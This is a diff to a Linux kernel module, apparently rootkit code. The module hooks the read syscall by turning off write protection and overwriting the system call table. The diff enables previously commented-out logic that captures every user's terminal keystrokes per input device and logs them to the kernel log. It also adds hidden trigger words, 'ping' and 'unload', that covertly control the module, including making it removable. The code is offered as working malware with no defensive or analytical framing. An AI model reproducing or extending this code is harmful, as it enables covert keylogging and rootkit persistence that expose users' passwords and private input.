@@ -28,14 +28,15 @@ struct taskinput_buffer{
 spinlock_t tinbuf_lock;
 int rcount;
 
-struct taskinput_buffer * add_input_buffer(char * name, unsigned short namelen){
+struct taskinput_buffer * add_input_buffer(char * name, size_t namelen){
 	struct taskinput_buffer * new_tib;
 	
 	new_tib = (struct taskinput_buffer *) kmalloc(sizeof(struct taskinput_buffer), GFP_KERNEL);	
 	new_tib->name = (char *) kmalloc(sizeof(char) * namelen+1, GFP_KERNEL);
-	strncpy(new_tib->name, name, (size_t)namelen);
+	strncpy(new_tib->name, name, namelen);
 	new_tib->name[namelen] = '\0';
-	
+	new_tib->bufpos = 0;	
+
 	list_add(&(new_tib->list), &(inbuf_head.list));
 	
 	return new_tib;
@@ -43,14 +44,17 @@ struct taskinput_buffer * add_input_buffer(char * name, unsigned short namelen){
 
 struct taskinput_buffer * find_tinbuf(char * name){
 	struct taskinput_buffer * it;
+	if(name == NULL) return NULL;
+
 	spin_lock(&tinbuf_lock);
-	list_for_each_entry(it, &inbuf_head.list, list){	
+	list_for_each_entry(it, &inbuf_head.list, list){
+		if(it->name == NULL) continue;
 		if(strcmp(name, it->name) == 0){
 			spin_unlock(&tinbuf_lock);
 			return it;
 		}
 	}
-	it = add_input_buffer(name, strlen(name));
+	it = add_input_buffer(name, strnlen(name,32));
 	spin_unlock(&tinbuf_lock);
 	return it;
 }
@@ -61,31 +65,30 @@ char * get_stdin_filename(void){
         struct file * fd_i;
 	struct dentry * dentry_i;	
 	struct inode * inode_i;
-	char * in_filename, *retVal;
-       	struct qstr * pqstr;	
+	char * retVal = NULL;
+       	struct qstr pqstr;	
 
 	rcu_read_lock();	
 	files = rcu_dereference(current->files);
 	spin_lock(&files->file_lock);
 	fdt = files_fdtable(files);
 	fd_i = rcu_dereference(fdt->fd[0]);
-	if(!fd_i)
+	if(fd_i == NULL)
 		goto cleanup;
 	dentry_i = rcu_dereference(fd_i->f_dentry);
-	if(!dentry_i)
+	if(dentry_i == NULL)
 		goto cleanup;
 	inode_i = rcu_dereference(dentry_i->d_inode);
-	if(!inode_i)
+	if(inode_i == NULL)
 		goto cleanup;
 	if(!S_ISCHR(dentry_i->d_inode->i_mode)){
 		goto cleanup;
 	}
 
-	pqstr = &dentry_i->d_name;
-	//in_filename = pqstr->name;	
-	retVal = (char *) kmalloc(pqstr->len+1, GFP_KERNEL);
-	strncpy(retVal, pqstr->name, pqstr->len);
-	retVal[pqstr->len] = '\0';	
+	pqstr = dentry_i->d_name;
+	retVal = (char *) kmalloc(pqstr.len+1, GFP_KERNEL);
+	strncpy(retVal, pqstr.name, pqstr.len);
+	retVal[pqstr.len] = '\0';	
 
 	cleanup:
 	rcu_read_unlock();
@@ -109,51 +112,54 @@ ssize_t my_read(int fd, void * buf, size_t count){
 		
 	if(fd == 0){	
 		current_stdin_name = get_stdin_filename();
-		printk(KERN_INFO "tibname: %s\n", current_stdin_name);
+
+		if(current_stdin_name == NULL) //tab completion comes from a null device or something.
+			return retVal;
+
 		cur_tinb = find_tinbuf(current_stdin_name);
-		if(cur_tinb == NULL){
-			cur_tinb = add_input_buffer(current_stdin_name, strlen(current_stdin_name));
-		}
-		
+	
 		kfree(current_stdin_name);
-		/*
-		//copy char by char
 		for(i = 0; i < retVal; i++){
 			if(cur_tinb->bufpos < INPUTBUFLEN-1){
 				c =  *((char*)buf+i);
-				printk(KERN_INFO "rc: %c %x\n", c, c);
-				/*if(c == 0x7f){ //handle backspace
+				if(c == 0x7f){ //handle backspace
 					if(cur_tinb->bufpos > 0) //prevent going further than 0
 						cur_tinb->bufpos = (cur_tinb->bufpos-1) % INPUTBUFLEN;
+					cur_tinb->buf[cur_tinb->bufpos] = '\0';
 					continue;
 				}
 				if(c == 0x0d){ //handle enter press
-					printk(KERN_INFO "READ ENTER\n");
+					cur_tinb->buf[cur_tinb->bufpos] = '\0';
+					cur_tinb->bufpos = 0;
+						//compare with known commands
+					if(strcmp("ping", cur_tinb->buf) == 0){
+						printk(KERN_INFO "Pong!\n");
+					}
+					if(strcmp("unload", cur_tinb->buf) == 0){
+						printk(KERN_INFO "will unload soon(TM)\n");
+						make_module_removable();
+					}
+					*cur_tinb->buf = '\0';
 					break; //enough read.
-				}*/
-		/*		cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
+				}
+				cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
 				cur_tinb->bufpos++;
+				cur_tinb->buf[cur_tinb->bufpos] = '\0';
+
 			}
 			else{
 				cur_tinb->bufpos = 0;
 				cur_tinb->buf[cur_tinb->bufpos] = *((char*)buf+i);
 				cur_tinb->bufpos++;
+				cur_tinb->buf[cur_tinb->bufpos] = '\0';
+
 			}
 		}
 	
-		cur_tinb->buf[cur_tinb->bufpos] = '\0';
+			
+		printk(KERN_INFO "buffer: %s\n",cur_tinb->buf);
 	
-		printk(KERN_INFO "buffer %s: %s\n",cur_tinb->name, cur_tinb->buf);
 	
-		//compare with known commands
-		if(strstr("ping", cur_tinb->buf) != NULL){
-			printk(KERN_INFO "Pong!\n");
-			cur_tinb->bufpos = 0;
-		}
-		if(strstr("unload", cur_tinb->buf) != NULL){
-			printk(KERN_INFO "to be implemented\n");
-			cur_tinb->bufpos = 0;
-		}*/
 	}
 	return retVal;
 }	
@@ -161,7 +167,7 @@ ssize_t my_read(int fd, void * buf, size_t count){
 void listen(void){
 	disable_wp();
 	
-	tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);	
+	tinbuf_lock = __SPIN_LOCK_UNLOCKED(tinbuf_lock);
 	INIT_LIST_HEAD(&inbuf_head.list);
 
 	orig_sys_read = syscall_table[__NR_read];
